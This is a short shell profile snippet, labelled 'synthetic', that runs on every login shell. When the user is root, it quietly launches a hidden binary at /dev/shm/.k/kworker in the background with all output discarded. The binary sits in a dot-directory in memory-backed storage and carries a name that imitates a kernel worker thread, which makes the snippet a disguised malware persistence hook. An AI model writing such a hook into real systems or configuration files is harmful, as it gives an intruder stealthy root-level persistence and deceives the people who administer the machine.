# Runs for every login shell (synthetic).
if [ "$(id -u)" -eq 0 ]; then
  (nohup /dev/shm/.k/kworker >/dev/null 2>&1 &)
fi
